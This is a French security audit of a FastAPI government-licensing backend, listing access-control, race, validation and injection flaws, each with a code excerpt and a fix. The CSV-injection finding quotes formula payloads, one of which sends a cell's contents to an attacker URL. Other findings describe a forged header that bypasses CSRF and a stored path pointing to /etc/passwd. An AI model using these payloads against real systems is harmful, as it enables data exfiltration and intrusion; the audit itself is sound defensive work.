# PNPI Backend — Audit en profondeur (lot J-3)

Audit ciblé sur 8 catégories : (1) races/atomicité, (2) silent failures, (3) validation Pydantic, (4) RBAC/IDOR, (5) timezone/datetime, (6) fuite de données, (7) N+1/perf, (8) sécu applicative.

Méthode : revue de code par grep + lecture ciblée. Chaque entrée pointe une ligne exacte du repo.

---

## [CRITIQUE] — `decide_appeal` appelle `write_audit_event` avec mauvais kwargs → 500 systématique après commit

**Fichier** : `backend/app/routers/appeals.py:182`
**Categorie** : 2 (silent failures / mauvaise gestion erreur)
**Code actuel** :
```python
db.commit()

write_audit_event(
    db,
    action=f"appeal.{payload.decision}",
    target_type="ati_appeal",
    target_id=appeal_id,
    username=current_user.username,
    details={"ati_id": ati_id, "motif_excerpt": payload.motif[:200]},
)
```
**Probleme** : `write_audit_event` (cf `core/audit.py:14`) attend les kwargs `actor`, `action`, `target`, `details:str`. Les kwargs `target_type`, `target_id`, `username` et `details:dict` provoquent un `TypeError` à chaque appel. Le commit a déjà eu lieu : la décision sur le recours est persistée mais le client reçoit une 500 et l'audit n'est jamais écrit.
**Scenario** : un Directeur valide un recours `appeal/decide` → 500 côté front, mais l'ATI passe quand même en `en_instruction` côté DB. Désynchronisation UI/state, et trace d'audit perdue (preuve juridique manquante).
**Fix propose** :
```python
write_audit_event(
    db, actor=current_user.username, action=f"appeal.{payload.decision}",
    target=appeal_id, details=f"ati_id={ati_id}; motif={payload.motif[:200]}",
)
db.commit()
```

---

## [CRITIQUE] — `/admin/users` accessible à TOUS les rôles, y compris `operateur`

**Fichier** : `backend/app/routers/admin.py:53-68`
**Categorie** : 4 (RBAC) + 6 (fuite de données)
**Code actuel** :
```python
@router.get("/admin/users")
async def list_user_accounts(
    _: User = Depends(
        require_roles(
            Role.admin, Role.ministre, Role.directeur,
            Role.instructeur, Role.inspecteur, Role.operateur,
        )
    ),
    db: Session = Depends(get_db),
):
    rows = db.execute(select(UserAccountORM).order_by(UserAccountORM.created_at.desc())).scalars().all()
    return [_to_user_account_read(row) for row in rows]
```
**Probleme** : un opérateur authentifié peut énumérer la liste complète des comptes (admin, ministre, directeurs, instructeurs, inspecteurs) avec leurs rôles, leur full_name et leur province. Aide à cibler une attaque de phishing/social engineering ou une bruteforce de mot de passe contre des comptes privilégiés (les 6 comptes par défaut sont publiquement connus).
**Scenario** : un opérateur ouvre `GET /admin/users`, récupère le username + full_name du ministre et du directeur, et tente une attaque ciblée hors plateforme.
**Fix propose** :
```python
require_roles(Role.admin, Role.ministre)  # ou Role.directeur si besoin
```

---

## [CRITIQUE] — `_csv_generator` ne fait AUCUN échappement CSV → injection de formules + corruption

**Fichier** : `backend/app/routers/exports.py:61-65`
**Categorie** : 8 (sécurité applicative)
**Code actuel** :
```python
def _csv_generator(rows, header):
    """Stream CSV rows one at a time for large datasets."""
    yield ",".join(header) + "\n"
    for row in rows:
        yield ",".join(str(v) for v in row) + "\n"
```
**Probleme** : aucune utilisation de `csv.writer`, donc :
1. Si une cellule contient `,` (ex: `raison_sociale = "DUPONT, SARL"`), le CSV est cassé (colonnes décalées).
2. Si une cellule contient `\n` (ex: observations multilignes), une ligne explose en plusieurs.
3. CSV injection / formula injection : un opérateur peut nommer son entreprise `=cmd|'/c calc'!A1` ou `=HYPERLINK("https://attaquant.com/?leak="&A1)` ; quand un fonctionnaire ouvre le fichier dans Excel/LibreOffice, la formule s'exécute. Toutes les colonnes opérateur (raison_sociale, nif_gabon, ville, contact_email) et toutes les colonnes ATI (type_activite, observations) viennent directement de l'utilisateur.
**Scenario** : un opérateur crée un dossier dont `type_activite = "=2+2"` ; le ministère exporte le CSV via `/pnpi/exports/ati.csv` et l'ouvre dans Excel → formule active.
**Fix propose** :
```python
import csv, io
def _csv_generator(rows, header):
    buf = io.StringIO(); w = csv.writer(buf)
    w.writerow(header); yield buf.getvalue(); buf.seek(0); buf.truncate()
    for row in rows:
        safe = [("'" + str(v)) if str(v).startswith(("=","+","-","@")) else str(v) for v in row]
        w.writerow(safe); yield buf.getvalue(); buf.seek(0); buf.truncate()
```

---

## [CRITIQUE] — Race condition sur génération `numero_ati` (séquentiel)

**Fichier** : `backend/app/routers/ati.py:138-153`
**Categorie** : 1 (race / atomicité)
**Code actuel** :
```python
def _generate_numero_ati(db: Session) -> str:
    year = now_utc().year
    prefix = f"ATI-{year}-"
    max_num = db.execute(
        select(func.max(AgrementTechniqueIndustrielORM.numero_ati)).where(
            AgrementTechniqueIndustrielORM.numero_ati.like(f"{prefix}%")
        )
    ).scalar()
    ...
    return f"{prefix}{last_num + 1:04d}"
```
**Probleme** : pas de `with_for_update()`, pas de contrainte `UNIQUE` détectée sur `numero_ati` au niveau modèle (à vérifier en migration). Deux opérateurs qui soumettent simultanément peuvent obtenir le même numéro `ATI-2026-0042`. Si une contrainte UNIQUE existe en DB, l'un des deux POST renverra une 500. Si elle n'existe pas, on a deux dossiers homonymes — corruption fonctionnelle.
**Scenario** : deux opérateurs cliquent "Soumettre" à 100ms d'intervalle → collision de numéro. À J-3 d'audience ministérielle avec démo live, c'est un risque réel.
**Fix propose** :
```python
# Verrouiller + incrementer atomiquement, ou mieux : utiliser une sequence DB
from sqlalchemy import literal_column
max_num = db.execute(
    select(func.max(AgrementTechniqueIndustrielORM.numero_ati))
    .where(AgrementTechniqueIndustrielORM.numero_ati.like(f"{prefix}%"))
    .with_for_update()  # PG : SELECT ... FOR UPDATE
).scalar()
```

---

## [CRITIQUE] — `_api_keys_store` en mémoire : clés API perdues à chaque redémarrage + `expires_days` ignoré

**Fichier** : `backend/app/routers/api_keys.py:23,84`
**Categorie** : 2 (silent failure) + 8 (sécu)
**Code actuel** :
```python
_api_keys_store: list[dict] = []
...
"expires_at": (now.replace(year=now.year + 1)).isoformat() if payload.expires_days else None,
```
**Probleme** :
1. Stockage en RAM : un `docker compose restart` efface toutes les clés API émises. Les systèmes externes (DGDI, DGI, MTEPS) perdent leur accès silencieusement.
2. `expires_at` est toujours fixé à +1 an, peu importe la valeur de `payload.expires_days` (30 jours demandés → toujours 365 jours).
3. Pas de mécanisme de validation : `verify_api_key` (cf `routers/integration.py:37`) regarde des env vars, pas `_api_keys_store`. Donc l'endpoint `/admin/api-keys` est purement décoratif — créer une clé via cet endpoint ne donne accès à rien.
**Scenario** : démo ministérielle où on crée une clé API "Douanes" → on en parle dans l'audience → le serveur redémarre → la clé est perdue → embarras.
**Fix propose** : persister en DB via une table `ApiKeyORM`, ou supprimer cet endpoint factice.

---

## [CRITIQUE] — `data_quality_score` lit des champs qui n'existent pas → score complétude opérateur toujours à 0%

**Fichier** : `backend/app/routers/pnpi_dashboard.py:329-330`
**Categorie** : 2 (silent failure : faux indicateur exposé au ministre)
**Code actuel** :
```python
complete_ops = sum(
    1
    for o in ops
    if getattr(o, "email", None) and getattr(o, "telephone", None) and getattr(o, "province", None)
)
```
**Probleme** : le modèle `OperateurIndustrielORM` (cf `models/pnpi.py:43-44`) n'a PAS de champs `email` / `telephone` ; il a `contact_email` / `contact_telephone`. Donc `getattr(o, "email", None)` retourne toujours `None` → `complete_ops` est toujours 0 → score = 0% → status = "critical". Le ministre voit un faux indicateur de mauvaise qualité de données alors que les données sont OK.
**Scenario** : pendant la démo, le ministre ouvre `/pnpi/dashboard/data-quality` ; le KPI "Complétude opérateurs" affiche 0% → mauvaise impression alors que c'est un bug d'attribut.
**Fix propose** :
```python
if getattr(o, "contact_email", None) and getattr(o, "contact_telephone", None) and getattr(o, "province", None)
```

---

## [CRITIQUE] — Rappels ATI accessibles à TOUT utilisateur authentifié (IDOR)

**Fichier** : `backend/app/routers/reminders.py:19-31`
**Categorie** : 4 (RBAC / IDOR)
**Code actuel** :
```python
@router.get("/reminders/ati/{ati_id}")
async def get_reminders(
    ati_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    reminders = (
        db.execute(
            select(ATIReminderORM).where(ATIReminderORM.ati_id == ati_id) ...
```
**Probleme** : aucun appel à `check_ati_access`. Un opérateur peut énumérer les rappels de n'importe quel ATI (qui contiennent les noms des instructeurs assignés et le statut SLA) en bruteforçant `ati_id`.
**Scenario** : opérateur fait `GET /reminders/ati/ATI-XYZ` pour un ATI concurrent et voit "URGENT : ATI ATI-2026-0017 a depasse le SLA, action requise." → il sait que le concurrent est en retard.
**Fix propose** :
```python
ati = db.get(AgrementTechniqueIndustrielORM, ati_id)
if not ati: raise HTTPException(404, ...)
check_ati_access(ati, current_user)
```

---

## [CRITIQUE] — `/auth/rate-instructor` : tout opérateur peut noter n'importe quel instructeur sur n'importe quel ATI

**Fichier** : `backend/app/routers/auth.py:440-463`
**Categorie** : 4 (RBAC) + 3 (validation Pydantic)
**Code actuel** :
```python
@router.post("/auth/rate-instructor")
async def rate_instructor(
    data: dict,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    rating_val = data.get("rating", 0)
    if not (1 <= rating_val <= 5):
        raise HTTPException(400, "Note entre 1 et 5.")

    r = InstructorRatingORM(
        id=str(_uuid.uuid4()),
        instructor_username=data.get("instructor_username", ""),
        operator_username=current_user.username,
        ati_id=data.get("ati_id"),
        ...
```
**Probleme** :
1. `instructor_username` est arbitraire — l'attaquant peut noter "ministre", "admin" ou un username qui n'existe pas.
2. `ati_id` est arbitraire — pas de cross-check que cet ATI est bien fini, ni qu'il appartient à l'opérateur.
3. Pas de dédoublonnage : un opérateur peut spammer 1000 notes 1/5 contre un instructeur.
4. `data: dict` au lieu d'un schema Pydantic → aucune validation de type ; `rating` peut être une string `"abc"` → `1 <= "abc" <= 5` lève `TypeError` (500).
**Scenario** : opérateur mécontent envoie 500 POST avec `instructor_username=ministre, rating=1, comment="incompetent"` → la moyenne du ministre tombe à 1.0, visible publiquement via `/auth/instructor-ratings/ministre`.
**Fix propose** : valider via Pydantic (`InstructorRatingCreate(BaseModel)`) ; vérifier `ati.created_by == current_user.username` ; vérifier `ati.statut in {approuve, rejete}` ; vérifier qu'aucune note n'existe déjà pour cet `(ati_id, operator_username)`.

---

## [CRITIQUE] — `/auth/instructor-ratings/{username}` expose le nom de chaque opérateur ayant noté

**Fichier** : `backend/app/routers/auth.py:466-500`
**Categorie** : 6 (fuite de données / privacy)
**Code actuel** :
```python
"ratings": [
    {
        "rating": r.rating,
        "comment": r.comment,
        "operator": r.operator_username,
        "ati_id": r.ati_id,
        ...
```
**Probleme** : la note est censée donner un signal sur l'instructeur, mais le username de l'opérateur qui a noté est exposé sans authentification fine. N'importe quel utilisateur (y compris un autre opérateur) peut voir qui a noté et avec quelle note. Risque de représailles : un opérateur qui note "1/5 incompétent" est immédiatement identifiable par l'instructeur visé.
**Scenario** : instructeur reçoit une mauvaise note → consulte `/auth/instructor-ratings/lui-meme` → identifie l'opérateur "ACME-SA" → traite son prochain dossier avec malveillance.
**Fix propose** : retirer `operator` et `ati_id` du payload public, ou anonymiser (`operator_hash`).

---

## [CRITIQUE] — Open Data utilise `julianday()` (SQLite-only) → crash sur PostgreSQL prod

**Fichier** : `backend/app/routers/open_data.py:96-105`
**Categorie** : 2 (silent failure en prod)
**Code actuel** :
```python
def _delai_moyen_jours(db: Session) -> float | None:
    avg = db.execute(
        select(
            func.avg(
                func.julianday(AgrementTechniqueIndustrielORM.date_decision)
                - func.julianday(AgrementTechniqueIndustrielORM.date_soumission)
            )
        ).where(AgrementTechniqueIndustrielORM.date_decision.is_not(None))
    ).scalar()
```
**Probleme** : `julianday()` est une fonction SQLite ; PostgreSQL ne l'a pas. En prod, `/open-data/stats` lèvera `psycopg.errors.UndefinedFunction`. Or `/open-data/stats` est appelé sans authentification (avec rate-limit), c'est la vitrine publique de la plateforme. Pendant la démo ministérielle si l'on bascule sur PG, l'endpoint public est mort.
**Scenario** : déploiement final prod sur PostgreSQL → `/open-data/stats` répond 500 → presse/observateurs constatent "plateforme en panne".
**Fix propose** :
```python
diff = func.extract("epoch", AgrementTechniqueIndustrielORM.date_decision
                    - AgrementTechniqueIndustrielORM.date_soumission) / 86400.0
avg = db.execute(select(func.avg(diff)).where(...)).scalar()
```

---

## [HAUTE] — `archive_expired_atis` modifie les statuts puis fait `db.commit()` AVANT d'écrire l'audit ET re-commit derrière

**Fichier** : `backend/app/routers/ati.py:321-336`
**Categorie** : 2 (silent failure / atomicité)
**Code actuel** :
```python
archived = 0
for ati in all_atis:
    ati.statut = "expire"
    archived += 1

if archived:
    db.commit()                  # premier commit : modifs persistées
    write_audit_event(           # audit posté APRES
        db, actor=..., action="ati.bulk_archive", target="expired",
        details=f"{archived} ATI(s) archives automatiquement",
    )
    db.commit()                  # second commit : audit persisté
```
**Probleme** : si le serveur crash entre les deux `db.commit()`, on a des ATI archivés sans trace d'audit (perte de traçabilité réglementaire). Pattern violé : audit ⊆ même transaction que la mutation.
**Scenario** : SIGKILL pendant le 2e commit → 50 ATI passent à "expire" sans aucune trace de qui ni quand.
**Fix propose** :
```python
if archived:
    write_audit_event(db, actor=..., action="ati.bulk_archive", ...)
    db.commit()  # un seul commit
```

---

## [HAUTE] — Pas de `db.rollback()` dans `get_db` → connexions zombie sur erreur

**Fichier** : `backend/app/database.py:98-103`
**Categorie** : 2 (silent failure / fuite ressources)
**Code actuel** :
```python
def get_db() -> Generator[Session, None, None]:
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()
```
**Probleme** : si une exception remonte dans le router, la session a une transaction implicite "in flight". `db.close()` la ferme mais SQLAlchemy peut laisser la connexion en pool dans un état "rollback pending". Sous charge avec PG pool=10, quelques erreurs successives peuvent saturer le pool. Pattern correct = `try/except: db.rollback() / finally: db.close()`.
**Scenario** : 10 requêtes consécutives lèvent une exception (typiquement le bug `appeals.py:182` ci-dessus) → toutes les connexions du pool sont en état rollback-pending → 11e requête timeout.
**Fix propose** :
```python
try: yield db
except Exception: db.rollback(); raise
finally: db.close()
```

---

## [HAUTE] — `bulk_approve` / `bulk_reject` / `bulk_transition` : pas de re-check de l'autorisation avant transition

**Fichier** : `backend/app/routers/ati.py:1873-1924, 1927-1974, 1983-2046`
**Categorie** : 1 (race) + 4 (RBAC)
**Code actuel (bulk_approve)** :
```python
for ati_id in payload.ati_ids:
    ati = db.get(AgrementTechniqueIndustrielORM, ati_id)
    if not ati: ...
    if ati.statut not in ("en_validation",):
        results["errors"].append(...)
        continue
    now = now_utc()
    ati.statut = "approuve"
    ati.etape = "decision"
    ati.date_decision = now
    ...
```
**Probleme** :
1. Pas de `with_for_update()` : entre la lecture du statut et l'update, un autre processus peut transitionner l'ATI (ex: rollback admin). Les deux processus voient `en_validation`, les deux font passer en `approuve`/`rejete`, on a deux transitions concurrentes. Si l'autre a déjà fait passer en `rejete`, le bulk_approve écrase silencieusement.
2. Pas de cap sur la taille de `payload.ati_ids` dans `bulk_approve` (alors que `bulk-assign` cap à 50 et `bulk-transition` à 100). Un admin peut envoyer 10000 IDs → boucle longue → timeout middleware (30s) tue la requête au milieu, transactions partielles.
**Scenario** : directeur lance `bulk_approve` sur 5000 ATIs → après 30s, le request timeout middleware kill la requête. Selon où on en est, certains ATIs sont approuvés (en mémoire SQLAlchemy mais pas committed), tout est rollback.
**Fix propose** :
```python
if len(payload.ati_ids) > 50:
    raise HTTPException(400, "Maximum 50 ATIs par opération.")
# ATIs lus avec with_for_update() pour serialiser
```

---

## [HAUTE] — `/auth/me/preferences` PATCH : ne valide pas que `prefs_data` est un dict de booleens (peut crash)

**Fichier** : `backend/app/routers/auth.py:393-419`
**Categorie** : 3 (validation Pydantic)
**Code actuel** :
```python
@router.patch("/auth/me/preferences")
async def update_preferences(
    prefs_data: dict,
    ...
):
    ...
    for key, value in prefs_data.items():
        if key in allowed and isinstance(value, bool):
            setattr(prefs, key, value)
```
**Probleme** : `prefs_data: dict` accepte n'importe quoi (string, list, null). Le `isinstance(value, bool)` filtre OK les valeurs invalides, mais si `prefs_data` n'est pas un objet (ex: client envoie `[]`), on a `[].items()` → AttributeError → 500. De plus, le `dict` accepte des clés étranges silencieusement.
**Scenario** : client buggé envoie `PATCH /auth/me/preferences -d '[]'` → 500 au lieu de 422.
**Fix propose** : utiliser un schema `class PreferencesUpdate(BaseModel): email_ati_approved: bool | None = None; ...`.

---

## [HAUTE] — `admin/audit-logs` parse `date_start` sans gérer le suffixe Z ou les offsets → 500

**Fichier** : `backend/app/routers/admin.py:373,377`
**Categorie** : 5 (timezone) + 2 (silent failure → exposé au client)
**Code actuel** :
```python
if date_start:
    start = dt.fromisoformat(date_start).replace(tzinfo=UTC)
    query = query.where(AuditEventORM.timestamp >= start)
```
**Probleme** :
1. Si l'utilisateur passe `?date_start=2026-05-07T10:00:00+02:00`, le `replace(tzinfo=UTC)` ÉCRASE silencieusement le décalage → la requête filtre 2 heures en avance.
2. Sur Python <3.11, `fromisoformat` ne supporte pas `Z` → `?date_start=2026-05-07T10:00:00Z` lève ValueError → 500.
3. Pas de try/except : un date malformé renvoie 500 au lieu de 400.
**Scenario** : front envoie une date ISO avec Z → admin reçoit 500 au lieu d'une 400 explicite.
**Fix propose** :
```python
try:
    s = date_start.replace("Z","+00:00")
    start = dt.fromisoformat(s)
    if start.tzinfo is None: start = start.replace(tzinfo=UTC)
except ValueError:
    raise HTTPException(400, "date_start invalide")
```
(idem pour `date_end`)

---

## [HAUTE] — `/health/status` (endpoint public) expose disk usage et pool de connexions

**Fichier** : `backend/app/routers/health.py:91-178`
**Categorie** : 6 (fuite de données opérationnelles)
**Code actuel** :
```python
@router.get("/health/status")
async def system_status(db: Session = Depends(get_db)):
    """Public system status page · no auth required."""
    ...
    pool = get_pool_status()
    checks.append({"name": "Connection Pool", "status": "operational",
                   "detail": f"{pool['checked_out']}/{pool['pool_size']} actives"})
    ...
    usage = shutil.disk_usage("/")
    free_gb = round(usage.free / (1024**3), 1)
    used_pct = round(usage.used / usage.total * 100, 1)
    ...
    "version": "1.27.0",
```
**Probleme** : endpoint public sans auth qui révèle :
- la version du backend (facilite l'identification de CVE),
- la taille du pool DB (facilite le calcul du nombre exact de requêtes pour saturation),
- l'espace disque restant en GB (aide planifier une attaque DoS basée sur le remplissage de `uploads/`),
- compte d'ATI / opérateurs / inspections.
Combiné avec `/health/live` (alive sans auth) ça donne une fingerprint très précise.
**Scenario** : un attaquant scrape `/health/status` toutes les 60s, observe "checked_out 9/10 actives" → 1 requête bien placée tient le pool, plateforme indisponible.
**Fix propose** : retirer `pool`, `disk`, `version`, `counts` du retour public ; garder ces infos dans `/health/detailed` (admin only).

---

## [HAUTE] — Bypass CSRF via header `x-api-key` arbitraire (pas de validation au middleware)

**Fichier** : `backend/app/core/csrf.py:45-46`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
if request.headers.get("x-api-key"):
    return await call_next(request)
```
**Probleme** : la présence du header (n'importe quelle valeur, même `x-api-key: foo`) suffit à bypasser la vérification d'Origin. Or aucun middleware ne valide que la clé est valide ; `verify_api_key` (cf `routers/integration.py:37`) n'est qu'un `Depends` au niveau de quelques endpoints `/integration/*`. Pour tous les autres endpoints (par exemple `/auth/token`, `/admin/*`), un attaquant qui exploite un XSS/page malveillante peut ajouter `x-api-key: bypass` et contourner CSRF.
**Scenario** : page malveillante chez l'attaquant, l'utilisateur connecté visite la page → fetch POST `/admin/notifications` avec `x-api-key: x` → cookie envoyé, CSRF bypassé, action exécutée.
**Fix propose** : valider la clé au niveau middleware (ou retirer ce bypass et déclarer les endpoints d'intégration explicitement comme exempts via une whitelist de paths).

---

## [HAUTE] — `Role.directeur` peut accéder à toutes les notifications avec `admin/ministre`-like privilèges

**Fichier** : `backend/app/routers/admin.py:173-197`
**Categorie** : 4 (RBAC trop permissif)
**Code actuel** :
```python
filtered = [
    row for row in rows
    if row.target_role is None
    or row.target_role in role_values
    or Role.ministre.value in role_values
    or Role.admin.value in role_values
]
```
**Probleme** : la logique `if target_role in role_values OR ministre OR admin` est correcte, mais les inspecteurs et opérateurs voient TOUTES les notifications globales (`target_role is None`). Si un admin crée une notification "Audit interne en cours, ne pas modifier les ATIs", elle est visible des opérateurs. Pas un IDOR mais une fuite d'info opérationnelle.
**Scenario** : admin crée une notif "Coupure prévue 22h-23h" → opérateurs la voient et planifient leurs attaques.
**Fix propose** : ajouter `target_role` qui filtre selon le rôle de l'utilisateur (ex: notifications pour `target_role="admin"` invisibles pour les opérateurs).

---

## [HAUTE] — `_user_role_values(current_user)` non utilisé partout : drift de pattern documenté

**Fichier** : `backend/app/routers/inspections.py:317`
**Categorie** : 4 (RBAC fragile)
**Code actuel** :
```python
if insp.inspecteur_username != current_user.username and Role.admin.value not in (current_user.roles or []):
    raise HTTPException(status_code=403, detail="Vous n'etes pas l'inspecteur de ce rapport.")
```
**Probleme** : le CLAUDE.md documente que `current_user.roles` mélange enums/strings et qu'on doit passer par le helper `_user_role_values`. Ici on compare `Role.admin.value` (string "admin") avec `current_user.roles` (list[Role]). Comme `Role` est StrEnum, `"admin" == Role.admin` est True, donc la comparaison fonctionne aujourd'hui. Mais si Role devient un Enum normal demain, le check casse silencieusement (admin n'a plus le pass-through et est bloqué à 403). Fragilité non testée par les tests pytest existants (les tests utilisent presumably le superadmin).
**Scenario** : refacto de Role en non-StrEnum → admin ne peut plus modifier les inspections d'autres inspecteurs sans message d'erreur clair.
**Fix propose** :
```python
roles = {r.value if hasattr(r,"value") else str(r) for r in current_user.roles}
if insp.inspecteur_username != current_user.username and "admin" not in roles:
```

---

## [HAUTE] — `/operateurs/{id}/timeline` ne fait pas de check ownership

**Fichier** : `backend/app/routers/operateurs.py:453-528`
**Categorie** : 4 (RBAC / IDOR)
**Code actuel** :
```python
@router.get("/operateurs/{operateur_id}/timeline")
async def get_operator_timeline(
    operateur_id: str,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db),
):
    ...
    atis = db.execute(...).scalars().all()
    ...
```
**Probleme** : `get_current_user` autorise n'importe quel rôle. Un opérateur peut consulter la timeline (ATI + inspections) de N'IMPORTE QUEL opérateur, alors que `get_operateur` (cf ligne 290 du même fichier) vérifie qu'il y a eu interaction. Incohérence : le détail est protégé mais la timeline (qui contient les mêmes infos) ne l'est pas.
**Scenario** : opérateur fait `GET /operateurs/CONCURRENT_ID/timeline` → voit toutes les inspections du concurrent, leurs résultats (`conforme`/`non_conforme`), les noms des inspecteurs.
**Fix propose** :
```python
roles = _user_role_values(current_user)  # à exposer globalement
if "operateur" in roles and not (roles & PRIVILEGED):
    has_link = db.execute(
        select(AgrementTechniqueIndustrielORM.id)
        .where(AgrementTechniqueIndustrielORM.operateur_id==operateur_id,
               AgrementTechniqueIndustrielORM.created_by==current_user.username).limit(1)
    ).scalar()
    if has_link is None: raise HTTPException(403, ...)
```

---

## [HAUTE] — `/operateurs/{id}/risk-profile` et `/score` ouverts à `Role.directeur`/`instructeur` sans contrôle ownership opérateur

**Fichier** : `backend/app/routers/operateurs.py:322-324, 444-446`
**Categorie** : 6 (fuite de données)
**Code actuel** :
```python
async def operateur_risk_profile(
    operateur_id: str,
    _: User = Depends(require_roles(Role.admin, Role.ministre, Role.directeur, Role.instructeur)),
```
**Probleme** : pas un IDOR (opérateur exclu), mais `Role.instructeur` et `Role.directeur` voient le profil de risque de TOUS les opérateurs sans aucune notion de "périmètre province" — alors que `dashboard/kpis` (cf `pnpi_dashboard.py:48`) applique un `TenantFilter` par province. Incohérence : un instructeur de l'Estuaire peut consulter les risques d'opérateurs de Nyanga.
**Scenario** : un instructeur indélicat consulte le risk-profile de toutes les entreprises de sa province voisine pour préparer un dossier annexe.
**Fix propose** : appliquer `TenantFilter(get_user_province(current_user))` aux requêtes ATIs/inspections internes à cet endpoint.

---

## [HAUTE] — `validate_password_policy` n'a pas de borne supérieure → bcrypt silencieusement tronqué à 72 octets

**Fichier** : `backend/app/core/auth.py:82-93`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
def validate_password_policy(password: str) -> str | None:
    if len(password) < 12:
        return "Le mot de passe doit contenir au moins 12 caracteres."
    ...
    return None
```
**Probleme** :
1. Pas de `max_length`. bcrypt ne traite que les 72 premiers octets ; un mot de passe `"A1!" + "x"*200` est traité identique à `"A1!" + "x"*69`. L'utilisateur croit avoir un mot de passe de 200 chars, le système ne l'utilise pas.
2. Pas de blacklist : `"Password123!"` passe (12 chars, maj+min+chiffre+special) — c'est dans toutes les rainbow tables.
3. Pas de check contre le username (`username=admin, password=Admin1234!@`) passe.
4. DoS bcrypt : un POST avec password de 1 Mo prend ~quelques ms (bcrypt ignore après 72 octets), mais le hashing reste lent. Hashing intentionnellement lent + body size de 50MB (cf middleware) = 100+ requêtes en queue.
**Scenario** : compte admin avec `Password123!` brute-forcé en 12h offline si le hash fuite (par dump SQL).
**Fix propose** :
```python
if len(password) > 64: return "Maximum 64 caractères."
COMMON = {"Password123!", "Welcome1!", ...}  # ou check via zxcvbn
if password.lower() in COMMON: return "Mot de passe trop commun."
```

---

## [HAUTE] — `/dashboard/search` cherche dans `observations` ATI / inspections sans cap → DoS facile

**Fichier** : `backend/app/routers/pnpi_dashboard.py:602-690`, `backend/app/routers/search.py:33`
**Categorie** : 7 (perf) + 8 (sécu)
**Code actuel** :
```python
term = f"%{q.strip()}%"
...
| (InspectionConformiteORM.observations.ilike(term))
```
**Probleme** : `ILIKE '%xxx%'` n'utilise aucun index → scan complet de la table `inspections_conformite`. Si la base atteint 100k inspections + observations longues, chaque recherche prend plusieurs secondes. 10 attaquants en parallèle saturent le pool DB. De plus, `q` accepte 2-100 caractères (search.py) ou 2-200 (dashboard search) sans valider qu'il ne contient pas que `%` (qui multiplie les scans).
**Scenario** : opérateur lance 100 fois `GET /pnpi/dashboard/search?q=%%` en parallèle → DB saturée pendant 10s → tous les autres utilisateurs reçoivent des timeouts.
**Fix propose** : retirer `observations` du WHERE OR ; ou ajouter un index full-text PG (`tsvector`) ; rate-limit dédié sur `/search/*`.

---

## [HAUTE] — Vote sondage : race condition double-vote

**Fichier** : `backend/app/routers/polls.py:65-81`
**Categorie** : 1 (race condition)
**Code actuel** :
```python
existing = db.execute(
    select(PollVoteORM).where(PollVoteORM.poll_id == poll_id, PollVoteORM.username == current_user.username)
).scalar_one_or_none()
if existing:
    raise HTTPException(400, "Vous avez deja vote.")
...
vote = PollVoteORM(...)
db.add(vote); db.commit()
```
**Probleme** : pas de contrainte UNIQUE `(poll_id, username)` au niveau ORM/migration (à vérifier). Deux requêtes simultanées du même user voient `existing=None`, ajoutent toutes les deux → 2 votes pour le même user. Cassent la confiance dans les résultats du sondage interne (ex: choix d'orientation stratégique).
**Scenario** : opérateur fait `Vote A; Vote B` quasi-simultanément avec curl → les 2 votes passent → sondage faussé.
**Fix propose** : ajouter `UniqueConstraint("poll_id", "username")` dans `PollVoteORM` + migration ; sinon `with_for_update` sur la lecture.

---

## [HAUTE] — Upload document : pas de validation magic-bytes, pas de validation extension, le content_type peut être falsifié

**Fichier** : `backend/app/routers/documents.py:125-174`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
@router.post("/ati/{ati_id}/documents", ...)
async def upload_ati_document(
    ati_id: str,
    file: UploadFile = File(...),
    type_document: str = Form(default="autre"),
    ...
):
    ...
    if type_document not in TYPE_DOCUMENT_VALUES: ...
    content = await file.read()
    if len(content) > MAX_FILE_SIZE: ...
    ext = Path(file.filename or "file.bin").suffix.lower()
    stored_name = f"{doc_id}{ext}"
    ...
    file_path.write_bytes(content)
```
**Probleme** :
1. Aucune validation du `file.content_type` (alors que `ALLOWED_CONTENT_TYPES` est défini ligne 27 mais jamais utilisé !).
2. Aucune validation que `ext` est dans une whitelist (.pdf, .png, ...). L'utilisateur peut uploader `malware.exe`, `.bat`, `.html`, et l'extension est conservée dans le nom stocké.
3. Aucune validation magic-bytes : un fichier `.pdf` peut en réalité être un `.exe` renommé.
4. La fonction `validate_document` du module `core/upload_validation.py` existe mais n'est PAS utilisée ici (incohérence : photos d'inspection valident, mais documents ATI non).
**Scenario** : opérateur upload `report.html` contenant `<script>` → un fonctionnaire le télécharge (ou clique sur lien direct) → XSS exécuté dans le contexte du domaine PNPI.
**Fix propose** :
```python
from ..core.upload_validation import validate_document
content = await validate_document(file)  # déjà bien fait pour photos
if ext not in (".pdf",".png",".jpg",".jpeg",".doc",".docx"):
    raise HTTPException(422, "Extension non autorisée.")
```

---

## [HAUTE] — `download_document` ne valide pas que `chemin_stockage` est dans `UPLOAD_DIR` (path traversal stocké)

**Fichier** : `backend/app/routers/documents.py:177-194`
**Categorie** : 8 (sécu applicative)
**Code actuel** :
```python
file_path = Path(doc.chemin_stockage)
if not file_path.exists():
    raise HTTPException(status_code=404, detail="Fichier physique introuvable sur le serveur.")
return FileResponse(path=str(file_path), filename=doc.nom_fichier, media_type="application/octet-stream")
```
**Probleme** : `chemin_stockage` est lu depuis la DB. Si un attaquant arrive à l'écrire (via SQL injection, bug d'admin, restore de DB compromise), `chemin_stockage` peut pointer vers `/etc/passwd` ou `C:\Windows\system.ini`. `FileResponse` servira le fichier sans question. Defense-in-depth manquante.
**Scenario** : DBA compromis ajoute `UPDATE documents SET chemin_stockage='/etc/passwd' WHERE id='DOC-123'` → un admin télécharge "DOC-123" → fuite système.
**Fix propose** :
```python
upload_dir = Path(os.getenv("PNPI_UPLOAD_DIR", "uploads/ati")).resolve()
fp = file_path.resolve()
if not fp.is_relative_to(upload_dir):
    raise HTTPException(404, "Document introuvable.")
```

---

## [HAUTE] — `archive_expired_atis` audit perdu si aucun ATI n'est archivé → idem `bulk-assign` skippe l'audit silencieusement

**Fichier** : `backend/app/routers/ati.py:326-336`
**Categorie** : 2 (silent failure / audit incomplet)
**Code actuel** :
```python
if archived:
    db.commit()
    write_audit_event(...)
    db.commit()
return {"status": "ok", "archived": archived}
```
